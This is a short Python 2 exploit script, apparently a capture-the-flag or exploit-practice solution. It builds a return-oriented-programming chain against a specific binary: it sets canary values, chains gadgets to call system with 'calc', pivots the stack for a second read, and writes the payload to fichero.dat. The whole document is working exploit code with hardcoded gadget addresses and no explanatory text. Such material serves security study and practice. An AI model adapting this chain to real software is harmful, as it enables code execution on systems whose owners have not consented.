import struct

p32 = lambda x :  struct.pack('<L', x)

byte_to_read = '\xFF'
canary = p32(0x25262728)
canary2 = p32(0x45464748)

#rop = p32(0x10101092) # add esp, 4 ; pop edi ; pop esi ; pop ebp
rop = p32(0x101014FE) # pop esi
rop += p32(0x101020B0) # system@.idata
rop += p32(0x101017FF) # mov     eax, offset unk_1010339C
rop += p32(0x10101450) # pop ecx
rop += 'calc'
rop += p32(0x101017E9) # mov     [eax+4], ecx
rop += p32(0x101017F9) # mov     eax, offset unk_101033A0
rop += p32(0x10101450) # pop ecx
rop += p32(0)
rop += p32(0x101017E9) # mov     [eax+4], ecx
rop += p32(0x101013B8) # call esi (at _start, its mean a loop executing a calc)
#rop += p32(0x101019C5) # call esi
rop += p32(0x1010339C+4) # arg = 'calc'

rop += 'B'*((0x64 - len(rop)) - 0x28)

rop += p32(0x10101003) # pop ebp
rop += p32(0x1010339C+0xC) # ebp
rop += p32(0x10101450) # pop ecx
rop += p32(0x10101092) # ecx jump at the beginning of payload # stack clean
rop += p32(0x101017FF) # mov     eax, offset unk_1010339C
rop += p32(0x101017E9) # mov     [eax+4], ecx
rop += p32(0x10101450) # pop ecx
rop += p32(0x64) # ecx # max length for the second read
rop += p32(0x1010164c) # mov eax, ecx
rop += p32(0x10101A28) # sub esp, eax ... push ebx ; push esi ; push edi ; ... ; push eax ; ... ; push [ebp-8]

print len(rop)

#padding = 'B'*(0x64 - len(rop))

estructura = byte_to_read + canary2 + canary
payload = estructura + rop

open('fichero.dat', 'wb').write(payload)

